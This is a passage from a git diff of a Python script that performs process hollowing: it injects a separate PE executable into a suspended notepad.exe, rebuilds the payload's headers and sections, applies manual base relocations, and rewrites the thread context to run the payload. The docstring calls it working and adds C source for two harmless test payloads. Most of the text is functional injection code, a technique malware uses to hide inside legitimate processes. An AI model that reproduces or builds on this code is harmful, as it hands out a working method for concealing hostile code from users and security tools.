@@ -1,4 +1,48 @@
 """
+Note: finally working
+- super messy, don't care, it works
+- will fix up and modularise when time permits
+
+Due to complexity of parsing/mapping PE data to memory structures
+-> there will be NO 'barebones' version
+
+Payload:
+-------
+Paylod examples are short POCs to prove everything works, original source below
+[+] simple_file.cpp - write a file to disk, and genenrated an audible beep sound
+Compile (VS Code -> x64 Native Tools cmd prompt) - cl.exe /MT /GS- /guard:cf- /O2 /Tc simple_file.cpp /link /GUARD:NO /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup kernel32.lib
+
+        #include <windows.h>
+        
+        void mainCRTStartup() {
+            HANDLE hFile = CreateFileA("C:\\Users\\Public\\hollowed.txt", 
+                                        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
+                                        FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                DWORD written;
+                WriteFile(hFile, "Hollowing Successful!", 21, &written, NULL);
+                CloseHandle(hFile);
+            }
+            Beep(1000, 500); // Audio cue
+            TerminateProcess(GetCurrentProcess(), 0);
+        }
+
+[+] simple_msg.cpp - show simple message box
+Compile (VS Code -> x64 Native Tools cmd prompt) - cl.exe /MT /GS- /O2 /Tc simple_msg.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup user32.lib kernel32.lib
+
+        #include <windows.h>
+        
+        void mainCRTStartup() {
+            // force a user32 call to initialize the subsystem -> GetDesktopWindow()
+            GetDesktopWindow();
+        
+            // call MessageBox
+            MessageBoxA(NULL, "Hollowed Process!", "Success", MB_OK);
+        
+            TerminateProcess(GetCurrentProcess(), 0);
+        }
+
+
 (prod) Process Hollowing Injection
 - arch: x64 process on x64 systems / 64-bit / PE32+
 - target: notepad.exe
@@ -9,15 +53,6 @@ Note: this technique does NOT work with shellcode
 - Windows loader expects PE file structure at base address
 
 
-Status: Incomplete - not fully functional
------------------------------------------
-- IAT fix needed -> logic described in fix_iat_for_hollowing()
-- causes STATUS_DLL_INIT_FAILED errors (0xc0000142)
-
-- previous Access Violation Exceptions (0xc0000005) appear resolved
-- likely due to misaligned CONTEXT64 struct
-- and/or Rip/Rsp not being 16-byte aligned in memory
-
 
 Steps:
 ------
@@ -27,6 +62,38 @@ Steps:
 - Write payload into allocated memory          -> WriteProcessMemory()
 - Do stuff...
 - Resume original thread                       -> ResumeThread()
+
+
+
+
+1. Hollow Notepad.
+2. Allocate at lpBaseAddress (wherever Windows gives you).
+3. Write the Payload headers and sections.
+4. Perform Base Relocation (The code above).
+5. Fix the IAT (The pefile IAT code provided earlier).
+6. Patch the PEB (Redirecting Windows to the new ImageBase).
+7. Redirect & Resume (Using the raw buffer 1232-byte offsets).
+
+
+FIX PEB
+-------
+
+FIX BASE RELOCATIONS
+--------------------
+Note: not needed if VirtualAllocEx() returns PE file's PreferredBase address -> Only PEB patching
+1. Calculate Delta: difference between where compiler wanted the file to be, and where it is actually put in memory. If Delta == 0, no relocations necessary
+2. Locate Relocation Table: retrieved from Data Directories
+3. Iterate through relocation blocks: 
+
+
+
+FIX IAT
+--------
+1. Parse the Import Directory: Use DIR_IMPORT (Index 1) from the Data Directory to find where the list of required DLLs starts.
+2. Iterate DLLs: Each IMAGE_IMPORT_DESCRIPTOR tells you the name of a DLL (e.g., user32.dll).
+3. Load DLL Locally: Use kernel32.LoadLibraryA in your Python process. (On Windows, system DLLs map to the same address in every process, so the address you find in Python is the same address needed in Notepad).
+4. Resolve Functions: For every function name in that DLL, use kernel32.GetProcAddress.
+5. Patch the Target: Use WriteProcessMemory to write that absolute address into the target’s IAT.
 """
 
 import ctypes
@@ -43,10 +110,7 @@ ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)
 # Payloads - sample(s)
 # ----------------------------------
 
-payload = r"c:\windows\system32\cmd.exe"
-
-
-
+payload = r"C:\Users\user\simple_file.exe"
 
 # ----------------------------------
 # CONSTANTS - functions
@@ -54,6 +118,7 @@ payload = r"c:\windows\system32\cmd.exe"
 
 # specify Target Process to hollow/hijack
 TARGET_PROCESS = r"c:\windows\system32\notepad.exe"
+
 
 # CreateProcessW() - samples
 CREATE_NO_WINDOW    = 0x08000000
@@ -91,6 +156,17 @@ PAGE_EXECUTE_READ       = 0x20
 PAGE_EXECUTE_READWRITE  = 0x40
 PAGE_EXECUTE_WRITECOPY  = 0x80
 
+# Stack and memory alignment
+STACK_SIZE      = 0x1000    # 4KB (one page)
+SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
+RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
+ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment
+
+# x64 CONTEXT offsets for manual buffer packing
+CTX_X64_RCX = 128
+CTX_X64_RSP = 152
+CTX_X64_RIP = 248
+CTX_X64_CONTEXT_FLAGS = 48
 
 # ----------------------------------
 # CONSTANTS - PE file layout
@@ -122,8 +198,9 @@ OPT_HDR_IMAGE_BASE          = 0x18  # 8 bytes
 OPT_HDR_SIZE_OF_IMAGE       = 0x38  # 4 bytes
 OPT_HDR_SIZE_OF_HEADERS     = 0x3C  # 4 bytes
 
+
 # ----- OPT_DATA DIRECTORIES ----- 
-OPT_HDR_DATA_DIRECTORIES    = 0x78
+OPT_HDR_DATA_DIRECTORIES    = 0x70
 DATA_DIRECTORY_SIZE         = 8     # 8 bytes, total size for one entry
 NUM_DATA_DIRECTORIES        = 16
 
@@ -164,7 +241,11 @@ SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes
 SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
 SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes
 
-
+# ----- RELOCATION TABLE BLOCKS -----
+RELOC_BLOCK_HEADER_SIZE     = 8         # PageRVA and BlockSize, 4-Bytes each
+RELOC_ENTRY_SIZE            = 2         # size of each TypeOffset entry (Bytes)
+RELOC_TYPE_BITSHIFT         = 12        # Type, in top 4-bits of TypeOffset entry
+RELOC_OFFSET_MASK           = 0x0FFF    # Offset, in bottom 12-bits of TypeOffset entry
 
 
 # ----------------------------------
@@ -222,78 +303,6 @@ class PROCESS_BASIC_INFORMATION(ctypes.Structure):
     ("InheritedFromUniqueProcessId",ctypes.c_void_p),
     ]
 
-# for CONTEXT64 struct
-class M128A(ctypes.Structure):
-    _pack_ = 16
-    _fields_ = [
-        ("Low", ctypes.c_uint64),
-        ("High", ctypes.c_int64),
-    ]
-
-# Used to store CPU register data, for a given thread
-# - struct required to be of specific length/size
-# - and registers at specific offsets
-# - otherwise, padding required to ensure fields exist on 16-byte boundaries
-#
-# Function to confirm above, created for this reason
-# - debug_cpu_registers()
-
-class CONTEXT64(ctypes.Structure):
-    _pack_ = 16
-    _fields_ = [
-        # Home Addresses (48 bytes)
-        ("P1Home", ctypes.c_uint64), ("P2Home", ctypes.c_uint64),
-        ("P3Home", ctypes.c_uint64), ("P4Home", ctypes.c_uint64),
-        ("P5Home", ctypes.c_uint64), ("P6Home", ctypes.c_uint64),
-        
-        ("ContextFlags", wintypes.DWORD),
-        ("MxCsr", wintypes.DWORD),
-        
-        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD),
-        ("SegEs", wintypes.WORD), ("SegFs", wintypes.WORD),
-        ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
-        ("EFlags", wintypes.DWORD),
-        
-        # Padding to force Dr0 to offset 80
-        ("Padding", wintypes.DWORD), 
-        
-        ("Dr0", ctypes.c_uint64), ("Dr1", ctypes.c_uint64), 
-        ("Dr2", ctypes.c_uint64), ("Dr3", ctypes.c_uint64), 
-        ("Dr6", ctypes.c_uint64), ("Dr7", ctypes.c_uint64),
-        
-        # Integer Registers (Rax at 128)
-        ("Rax", ctypes.c_uint64), ("Rcx", ctypes.c_uint64), 
-        ("Rdx", ctypes.c_uint64), ("Rbx", ctypes.c_uint64),
-        ("Rsp", ctypes.c_uint64), ("Rbp", ctypes.c_uint64),
-        ("Rsi", ctypes.c_uint64), ("Rdi", ctypes.c_uint64),
-        ("R8",  ctypes.c_uint64), ("R9",  ctypes.c_uint64), 
-        ("R10", ctypes.c_uint64), ("R11", ctypes.c_uint64),
-        ("R12", ctypes.c_uint64), ("R13", ctypes.c_uint64), 
-        ("R14", ctypes.c_uint64), ("R15", ctypes.c_uint64), 
-        
-        # Padding to force Instruction Pointer (RIP) to 264
-        ("AlignPadding2", ctypes.c_uint64),
-        
-        ("Rip", ctypes.c_uint64), 
-        
-        # Floating point (512 bytes)
-        ("FltSave", M128A * 32),
-        
-        # Vector registers
-        # - *n modified to 25 here, no code requirement for below registers
-        # - no need to be COMPLETELY accurate here-on
-        ("VectorRegister", M128A * 25),
-        ("VectorControl", ctypes.c_uint64),
-
-        ("DebugControl", ctypes.c_uint64),
-        ("LastBranchToRip", ctypes.c_uint64),
-        ("LastBranchFromRip", ctypes.c_uint64),
-        ("LastExceptionToRip", ctypes.c_uint64),
-        ("LastExceptionFromRip", ctypes.c_uint64),
-    ]
-
-
-
 
 # ----------------------------------
 # Function Prototypes
@@ -302,6 +311,12 @@ class CONTEXT64(ctypes.Structure):
 # ------------------- kernel32.dll -------------------
 kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
 kernel32.CloseHandle.restype = wintypes.BOOL
+
+kernel32.GetProcAddress.argtypes = [
+    wintypes.HANDLE,        # Module
+    wintypes.LPCSTR,        # lpProcName
+]
+kernel32.GetProcAddress.restype = ctypes.c_void_p
 
 
 kernel32.CreateProcessW.argtypes =[
@@ -319,12 +334,27 @@ kernel32.CreateProcessW.argtypes =[
 kernel32.CreateProcessW.restype = wintypes.BOOL
 
 
+kernel32.CreateRemoteThread.argtypes = [
+    wintypes.HANDLE,                        # hProcess
+    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes
+    ctypes.c_size_t,                        # dwStackSize
+    ctypes.c_void_p,                        # lpStartAddress
+    wintypes.LPVOID,                        # lpParameter
+    wintypes.DWORD,                         # dwCreationFlags
+    ctypes.POINTER(wintypes.DWORD),         # lpThreadId   
+]
+kernel32.CreateRemoteThread.restype = wintypes.HANDLE
+
 kernel32.GetThreadContext.argtypes = [
-    wintypes.HANDLE,                    # hThread
-    ctypes.POINTER(CONTEXT64),          # lpContext
+    wintypes.HANDLE,        # hThread
+    ctypes.c_void_p,        # lpContext (no longer ctypes.Structure)
 ]
 kernel32.GetThreadContext.restype = wintypes.BOOL
 
+kernel32.LoadLibraryA.argtypes = [
+    wintypes.LPCSTR,        # lpLibFileName
+]
+kernel32.LoadLibraryA.restype = wintypes.HMODULE
 
 kernel32.ReadProcessMemory.argtypes = [
     wintypes.HANDLE,                    # hProcess
@@ -337,8 +367,8 @@ kernel32.ReadProcessMemory.restype = wintypes.BOOL
 
 
 kernel32.SetThreadContext.argtypes = [
-    wintypes.HANDLE,            # hThread
-    ctypes.POINTER(CONTEXT64),  # *lpContext
+    wintypes.HANDLE,        # hThread
+    ctypes.c_void_p,        # *lpContext (no longer ctypes.Structure)
 ]
 kernel32.SetThreadContext.restype = wintypes.BOOL
 
@@ -350,7 +380,7 @@ kernel32.VirtualAllocEx.argtypes = [
     wintypes.DWORD,         # flAllocationType
     wintypes.DWORD,         # flProtect
 ]
-kernel32.VirtualAllocEx.restype = ctypes.c_void_p
+kernel32.VirtualAllocEx.restype = wintypes.LPVOID
 
 
 kernel32.VirtualProtectEx.argtypes = [
@@ -391,12 +421,9 @@ ntdll.NtUnmapViewOfSection.argtypes = [
 ntdll.NtUnmapViewOfSection.restype = ctypes.c_long
 
 
-
-
 # ----------------------------------
 # Function Definitions
 # ----------------------------------
-
 
 # --------------- PE parser helper functions ---------------
 #
@@ -406,20 +433,86 @@ ntdll.NtUnmapViewOfSection.restype = ctypes.c_long
 # e_lfanew ->   [PE Signature       - 4 bytes]
 #               [File Header        - 20 bytes]
 #               [Optional Header    - variable]
-#               [Section Table      - no Sections x 40bytes]
+#               [Section Table      - num. Sections x 40bytes]
+
+
+# Previosly, subsequent helper functions assumeed/referred to initial pe_offset being defined
+# - now, all standalone in that only arg passed is f:object
+
+# ----- Offset-Of -----
 
 def get_pe_header_offset(f: object) -> int:
     f.seek(PE_OFFSET)
-    return struct.unpack('<I', f.read(4))[0]
+    pe_offset = struct.unpack('<I', f.read(4))[0]
 
-def get_file_header_offset(pe_offset: int) -> int:
-    return pe_offset + PE_SIGNATURE_SIZE
+    return pe_offset
 
-def get_optional_header_offset(pe_offset: int) -> int:
-    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE
+def get_file_header_offset(f: object) -> int:
+    pe_offset = get_pe_header_offset(f)
+    file_header_offset = pe_offset + PE_SIGNATURE_SIZE
 
-def get_section_table_offset(pe_offset: int, size_of_optional_header: int) -> int:
-    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_of_optional_header
+    return file_header_offset
+
+def get_optional_header_offset(f: object) -> int:
+    pe_offset = get_pe_header_offset(f)
+    opt_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE
+
+    return opt_header_offset
+
+def get_reloc_dir_offset(f: object) -> int:
+    optional_header_offset = get_optional_header_offset(f)
+    reloc_dir_offset = optional_header_offset + OPT_HDR_DATA_DIRECTORIES + (DIR_BASERELOC * DATA_DIRECTORY_SIZE)
+    
+    return reloc_dir_offset
+    
+def get_section_table_offset(f: object) -> int:
+    pe_offset = get_pe_header_offset(f)
+    size_optional_header = get_size_optional_header(f)
+    section_table_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_optional_header
+
+    return section_table_offset
+
+def get_size_of_image_offset(f: object) -> int:
+    optional_header_offset = get_optional_header_offset(f)
+    size_of_image_offset = optional_header_offset + OPT_HDR_SIZE_OF_IMAGE
+    
+    return size_of_image_offset
+
+# ----- Size-Of -----
+
+def get_size_optional_header(f: object) -> int:
+    file_header_offset = get_file_header_offset(f)
+    f.seek(file_header_offset + FILE_HDR_SIZE_OF_OPT_HDR)
+    size_of_opt_header = struct.unpack('<H', f.read(2))[0]
+
+    return size_of_opt_header
+
+def get_size_of_headers(f: object) -> int:
+
+    optional_header_offset = get_optional_header_offset(f)
+    f.seek(optional_header_offset + OPT_HDR_SIZE_OF_HEADERS)
+    size_of_headers = struct.unpack('<I', f.read(4))[0]
+
+    return size_of_headers
+
+
+def get_size_of_image(f:object) -> int:
+    """ Size of file in memory, NOT the file size on disk, SizeOfImage > SizeOfFileOnDisk """
+
+    size_of_image_offset = get_size_of_image_offset(f)
+    f.seek(size_of_image_offset)
+    size_of_image = struct.unpack('<I', f.read(4))[0]
+
+    return size_of_image
+
+# ----- Number-Of -----
+
+def get_number_of_sections_in_section_table(f) -> int:
+    file_header_offset = get_file_header_offset(f)
+    f.seek(file_header_offset + FILE_HDR_NUM_SECTIONS)
+    num_sections = struct.unpack('<H', f.read(2))[0]
+
+    return num_sections
 
 
 def get_oep_rva(payload: str) -> int:
@@ -438,8 +531,8 @@ def get_oep_rva(payload: str) -> int:
 
     with open(payload, 'rb') as f:
         pe_offset = get_pe_header_offset(f)
-        opt_hdr_offset = get_optional_header_offset(pe_offset)
-        f.seek(opt_hdr_offset + OPT_HDR_ENTRY_POINT)
+        optional_header_offset = get_optional_header_offset(f)
+        f.seek(optional_header_offset + OPT_HDR_ENTRY_POINT)
 
         oep_rva = struct.unpack('<I', f.read(4))[0]
         print(f"    -> oep_rva: {hex(oep_rva)}")
@@ -511,23 +604,6 @@ def print_hdr(hdr: str) -> None:
     print(f"\n{border}{hdr}{border}")
 
 
-def debug_cpu_registers() -> None:
-    """
-    CONTEXT64() struct used to hold a snapshot of a thread's processor state
-    - here we debug to confirm proper struct size and register offsets
-    - if numbers do NOT match expectations, then padding in STRUCT def are REQUIRED
-    - due to persistent 0xc000000005 Access Violation errors when calling ResumeThread()
-    """
-    
-    print(f"\n[+] DEBUG: CONTEXT64() struct and CPU register offset info:")
-    print(f"    -> Struct size: {ctypes.sizeof(CONTEXT64)} (Expected: 1232)")
-    print(f"    -> Dr0 Offset: {CONTEXT64.Dr0.offset} (Expected: 80 or 96)")
-    print(f"    -> Rax Offset: {CONTEXT64.Rax.offset} (Expected: 128 or 144)")
-    print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 264)")
-
-    pause()
-
-
 # --------------- Create SUSPENDED Process ---------------
 
 
@@ -593,13 +669,28 @@ def create_process(
 # --------------- Gathering Process Information ---------------
 
 
-def get_img_base_addr(hProcess: wintypes.HANDLE) -> ctypes.c_void_p:
+def get_img_base_addr(hProcess: wintypes.HANDLE) -> tuple[PROCESS_BASIC_INFORMATION(), ctypes.c_void_p]:
 
     """
     Return the ImageBaseAddress (from PEB)
     - this field contains the virtual address in memory, where .exe file loaded
     - functions, variables etc inside program, are all located at specific offsets relative to this address
     - this value is required to navigate process' memory -> read PE header, find entry point etc
+
+    Why:
+    ----
+    1. Mapping Destination
+    - compiled PEs have a preferred 'ImageBaseAddress'
+    - when calling VirtualAllocEx(), this is where the file wants to be loaded in memory
+    - if memory can be allocated at that preferred memory address, payload is already 'at home'
+    - otherwise, memory must be mapped at different address, and delta must be applied to relocations
+    
+    2. Rebasing, fixing Absolute Addresses
+    - most compiled binaries use 'absolute addresses' for globals and jump tables
+    - PAYLOAD compiled expecting to live at 'ImageBaseAddress'
+    - pointers all point to dead space -> must be adjusted, in reference to 'ImageBaseAddress'
+
+    
 
     Step 1:
     - call NtQueryInformationProcess() <- PBI struct populated
@@ -654,7 +745,7 @@ def get_img_base_addr(hProcess: wintypes.HANDLE) -> ctypes.c_void_p:
 
     print(f"    -> img_base_addr: {hex(image_base.value)}")
 
-    return image_base.value
+    return pbi, image_base.value
 
 
 # --------------- Calculating Entry Point ---------------
@@ -690,7 +781,8 @@ def hollow_process(
     if status != 0:
         print(f"[!] Failed, Status Code: {status}")
         raise winerr()
-        
+    
+    print(f"    -> Error Status Code: {status}")
     print(f"    -> Successful, hollowed-out target memory at: {hex(base_address)}")
 
 
@@ -711,10 +803,10 @@ def get_size_of_payload(payload: str) -> int:
         pe_offset = get_pe_header_offset(f)
 
         # 2. Jump to start of Optional Header
-        opt_hdr_offset = get_optional_header_offset(pe_offset)
+        optional_header_offset = get_optional_header_offset(f)
         
         # 3. SizeOfImage at Offset 56 within Optional Header
-        size_of_image_offset = opt_hdr_offset + OPT_HDR_SIZE_OF_IMAGE
+        size_of_image_offset = optional_header_offset + OPT_HDR_SIZE_OF_IMAGE
         
         f.seek(size_of_image_offset)
         size_of_image = struct.unpack('<I', f.read(4))[0]
@@ -781,46 +873,30 @@ def write_payload(
 
     with open(payload, 'rb') as f:
 
-        # 1. Get all header offsets
-        pe_offset           = get_pe_header_offset(f)               # 1 
-        file_header_offset  = get_file_header_offset(pe_offset)     # 2
-        opt_hdr_offset      = get_optional_header_offset(pe_offset) # 3
-
-        f.seek(file_header_offset + FILE_HDR_SIZE_OF_OPT_HDR)
-        size_of_opt_header = struct.unpack('<H', f.read(2))[0]
-        section_table_offset = get_section_table_offset(pe_offset, size_of_opt_header) #4
-
-
-        # Headers - map/write
-        f.seek(opt_hdr_offset + OPT_HDR_SIZE_OF_HEADERS)
-        size_of_headers = struct.unpack('<I', f.read(4))[0]
-
-        f.seek(0)
-        header_data = f.read(size_of_headers)
-        bytes_written = ctypes.c_size_t(0)
+        size_of_headers = get_size_of_headers(f)    # get how many bytes in header section
+        f.seek(0)                                   # go back to beginning of file
+        header_buffer = f.read(size_of_headers)     # read in bytes of size 'size_of_headers'
+        bytes_written = ctypes.c_size_t(0)          # pointer to number of byte written
         
         print(f"\n[+] Writing Header Information: WriteProcessMemory()")
         
         if not kernel32.WriteProcessMemory(
             hProcess, 
             ctypes.c_void_p(lpBaseAddress), 
-            header_data, 
+            header_buffer, 
             size_of_headers, 
             ctypes.byref(bytes_written)    # lpNumberOfBytesWritten (optional)
         ):
             raise winerr()
 
         print(f"    -> Headers written: {bytes_written.value} bytes")
-
-        
         print()
 
         # Section Table - map/write
         # - the Section Table, is an array of Section Headers
         # - section[S] will include .text, .data, .rsrc, .reloc etc
-
-        f.seek(file_header_offset + FILE_HDR_NUM_SECTIONS) # NumberOfSections
-        num_sections = struct.unpack('<H', f.read(2))[0]
+        num_sections = get_number_of_sections_in_section_table(f)
+        section_table_offset    = get_section_table_offset(f)
         
         for i in range(num_sections):
 
@@ -875,62 +951,244 @@ def redirect_to_payload(
     Retrieve CPU-register info for target hThread
     - re-direct Instruction Pointer (Rip) to new entry point
     """
-
-    # ensure CONTEXT64 struct is 16-byte aligned in memory
-    # - previous script iterations caused 0xc0000005 Access Violation errors...
-    # - here, forcing 16-byte alignment (something something SSE instructions)
-
-    # Below, force CONTEXT64 16-byte boundry alignment
-    #
-    # Steps:
-    # - allocate extra 16 bytes to give wiggle room
-    # 
-    # at aligned_addr:
-    # - move into next boundry (+ 0xF, or 15 decimal)
-    # - apply bitmask to zero-out last 4 bits -> 0 (~15, as 15 decimal = 1111 binary)
-    # - binary value that ends in 0000 is divisible by 16 -> eg 1011 0000
     
-    raw_buffer = ctypes.create_string_buffer(ctypes.sizeof(CONTEXT64) + 16)
-    raw_addr = ctypes.addressof(raw_buffer)
-    aligned_addr = (raw_addr + 0xF) & ~0xF
+    # Get original_rip, using 1232-byte raw-buffer + 16 for manual alignment
     
-    # map struct onto above specific memory address
-    ctx = CONTEXT64.from_address(aligned_addr)
-    ctx.ContextFlags = CONTEXT_ALL # 0x10001f
+    
+    raw_buffer = ctypes.create_string_buffer(1232 + 16)
+    # this is just the memory location
+    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
+    # map chcar array onto the aligned address -> struct.pack_into() / unpack_from()
+    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
+    
+    # set ContextFlags to CONTEXT_ALL, @ offset 48 <- return all registers
+    struct.pack_into("<I", aligned_buffer, CTX_X64_CONTEXT_FLAGS, CONTEXT_ALL)
 
 
-
-
-    # retrieve information on CPU registers    
-    print(f"\n[+] Reading current state of CPU-registers for thread: GetThreadContext()")
-
-    if not kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
+    # ---------- GET: Current state of thread's registers ----------
+    print(f"\n[+] Capturing current thread state: ", end='')
+    if not kernel32.GetThreadContext(hThread, aligned_addr):
         raise winerr()
-
-    # old v new Rip
-    print(f"    -> Original Instruction Pointer: {hex(ctx.Rip)}")
-    ctx.Rip = entry_point_va
-    print(f"    -> New Instruction Pointer:      {hex(ctx.Rip)}")
+    print("Success")
 
 
-    # ensure Stack Pointer (Rsp) is also 16-byte aligned     
-    # - additionally, add 'shadow space' (-0x20, or 32 decimal)
-    # - this reserves extra space on stack to save and restore register values from function calls
+    # ----- Save original values for important registers
+    original_rip = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RIP)[0]
+    original_rsp = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RSP)[0]
+    original_rcx = struct.unpack_from("<Q", aligned_buffer, CTX_X64_RCX)[0]
+
+    
+    # Apply re-direction - Rip and Rcx
+    struct.pack_into("<Q", aligned_buffer, CTX_X64_RIP, entry_point_va) # Rip
+    struct.pack_into("<Q", aligned_buffer, CTX_X64_RCX, entry_point_va)
+
+    
+    # ----- Instruction Pointer @ offset 248
+    print(f"\n[+] Adjusting Instruction Pointer:")
+    print(f"    -> Orig Rip: {hex(original_rip)}")
+    print(f"    -> New Rip:  {hex(entry_point_va)}")
+
+    # ----- Rcx - First Integer Argument Register
+    
+    print(f"\n[+] Adjusting Rcx - first integer arg register:")
+    print(f"    -> Orig Rcx: {hex(original_rcx)}")
+    print(f"    -> New Rcx:  {hex(entry_point_va)}")
+
+
+    # ----- Stack Pointer @ offset 152
+    #
+    # - align to 16-bytes boundry
+    # - reserve Shadow Space on stack to save/restore values from function calls
     print(f"\n[+] Adjusting Stack Pointer Alignment:")
 
-    # old v new
-    print(f"    -> Old Rsp: {hex(ctx.Rsp)}")
-    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x20  # Align and add "Shadow Space"
-    print(f"    -> New Rsp (Aligned): {hex(ctx.Rsp)}")
+    #new_rsp = (original_rsp & ALIGNMENT_MASK) - SHADOW_SPACE
+    new_rsp = (original_rsp & ALIGNMENT_MASK) - SHADOW_SPACE - RET_ADDR_SIZE
+    struct.pack_into('<Q', aligned_buffer, CTX_X64_RSP, new_rsp)
+    print(f"    -> Old Rsp:           {hex(original_rsp)}")
+    print(f"    -> New Rsp (Aligned): {hex(new_rsp)}")
 
 
     # apply changes
     print(f"\n[+] Redirecting Instruction Pointer to new entrypoint: SetThreadContext()")
-    if not kernel32.SetThreadContext(hThread, ctypes.byref(ctx)):
+    if not kernel32.SetThreadContext(hThread, aligned_addr):
         raise winerr()
     print(f"    -> Successful")
 
 
+
+def get_payload_preferred_base(payload_path):
+    with open(payload_path, 'rb') as f:
+        # 1. Get PE Header offset from DOS header (0x3C)
+        f.seek(PE_OFFSET)
+        pe_offset = struct.unpack('<I', f.read(4))[0]
+        
+        # 2. Preferred ImageBase is in the Optional Header
+        # Offset: PE_Header + Signature(4) + FileHeader(20) + ImageBaseOffset(24)
+        image_base_offset = pe_offset + 4 + 20 + 24 
+        
+        f.seek(image_base_offset)
+        # Read 8 bytes for 64-bit ImageBase
+        preferred_base = struct.unpack('<Q', f.read(8))[0]
+        
+        return preferred_base
+
+
+
+
+def perform_manual_relocation(hProcess, lpBaseAddress, preferred_base, payload_path):
+    """
+    Here we perform a manual Base Relocation
+    - in order to address discrepancies between the 'Preferred Base' and 'Actual Base'
+    
+    When a PE file executes, it has a 'Preferred Base', (eg 0x140000000)
+    - compiler hard-codes every pointer (to strings/var etc) using this address as a reference
+    - however, when target process hollowed, VirtualAllocEx() will return a random address (Actual Base)
+    - hard-coded pointers are now all wrong -> point to empty space where compiler thought strings/vars would be
+
+    To keep in mind:
+    - here we are dealing with two different 'tables'
+    - Section Table -> find which section contains reloc_va
+    - Base Relocation Table -> iterate through each block, and data within
+    
+    Summary:
+    - manually parse '.reloc' and patch Absolute memory addresses in target process
+    - read relocation table from file, ON DISK
+    - patch the memory of the target / hollowed process
+
+    Steps:
+    - find Relative Virtual Address (reloc_va) of the Base Relocation Table
+    - iterate through SectionTable blocks/sections -> find section that contains reloc_va
+    - if v_addr <= reloc_va < (v_addr + v_size), then you have found the right section
+    - here, look at PointerToRawData, the offset/address where relocation table begins, ON DISK
+    - iterate through table, patch memory addresses
+    
+    Why not just find section named '.reloc' directly?
+    - guaranteed 4+ sections (.text, .rdata, .data, .reloc etc)
+    - however these are 'standard' names and not guaranteed to named such
+    - relocation table typically stored in .reloc, but not guaranteed to be this name
+    - therefore iterate through all section headers
+    
+    """
+    delta = lpBaseAddress - preferred_base
+    
+    if delta == 0:
+        print(f"[!] Delta is 0, skipping relocation")
+        return
+        
+    print(f"\n[+] Performing Manual Relocation, (delta: {hex(delta)})")
+    
+    with open(payload_path, 'rb') as f:
+        # get relocation directory info (virtual address, and size)
+        f.seek(get_reloc_dir_offset(f))
+        
+        # start address of entire relocation database for payload
+        reloc_va   = struct.unpack('<I', f.read(4))[0]  
+        reloc_size = struct.unpack('<I', f.read(4))[0]
+        
+        if reloc_va == 0:
+            print(f"[!!] No relocation table found in payload.")
+            return
+
+
+        # Iterate through Section Table (array of Section Headers)
+        # - find correct section (likely '.reloc'
+        #
+        # Section Header layout (, bytes)
+        # [Name, 8]
+        # [VirtualSize,     4] [VirtualAddress, 4]
+        # [SizeOfRawData,   4] [PtrToRawData,   4]
+        # [PtrToRelocs,     4] [PtrToLineNums,  4]
+        # [NumOfRelocs,     2] [NumOfLineNums,  2]
+        # [Characteristics, 4] <- flags, executable/writable?
+        num_sections = get_number_of_sections_in_section_table(f)
+        section_table_ptr = get_section_table_offset(f)
+        reloc_file_ptr = 0
+
+        for i in range(num_sections):
+            f.seek(section_table_ptr + (i * SECTION_HEADER_SIZE))
+                
+            # read VirtualSize, VirtualAddress, and PtrToRawData
+            f.seek(8, 1)    # skip name
+            v_size, v_addr = struct.unpack('<II', f.read(8))
+            f.seek(4,1)     # skip SizeOfRawData -> PointerToRawData
+            ptr_to_raw_data = struct.unpack('<I', f.read(4))[0]
+            
+            if v_addr <= reloc_va < (v_addr + v_size):
+                # translate memory addres, into a file address
+                # - find exact byte offset where relocation data begins
+                reloc_file_ptr = ptr_to_raw_data + (reloc_va - v_addr)
+                break
+                
+        if reloc_file_ptr == 0:
+            print(f"[!] Coule not map Relocation Virtual Address, to file offset.")
+            return
+            
+            
+        # iterate through Relocation Blocks
+        #
+        # Memory layout [field, Bytes]
+        # [VirtualAddress,  4]  - rva of 4KB 'page' being patched (page_rva)
+        # [SizeOfBlock,     4]  - total size of block, header + entries
+        # [TypeOffset[0],   2]
+        # [TypeOffset[1],   2]
+        # [TypeOffset[n],   2]
+        #
+        # TypeOffset memory layout [field, bits]
+        # [Type,     4] - here we look for Type 10, 'IMAGE_REL_BASED_DIR54'
+        # [Offset,  12]
+        
+        current_offset = 0
+        while current_offset < reloc_size:
+            f.seek(reloc_file_ptr + current_offset)
+            
+            page_rva    = struct.unpack('<I', f.read(4))[0]
+            size_block  = struct.unpack('<I', f.read(4))[0]
+
+            if size_block == 0: break
+            
+            # iterate through each entry, 2-bytes each
+            # - subtract header size to find how many bytes of entries to iterate
+            # - divide by entry_size, to determine number of entries
+            num_entries = (size_block - RELOC_BLOCK_HEADER_SIZE) // RELOC_ENTRY_SIZE
+            
+            for _ in range(num_entries):
+                entry = struct.unpack('<H', f.read(2))[0]
+                
+                # find Type -> shift right by 12 to isolte top 4 bits
+                reloc_type = entry >> RELOC_TYPE_BITSHIFT
+                
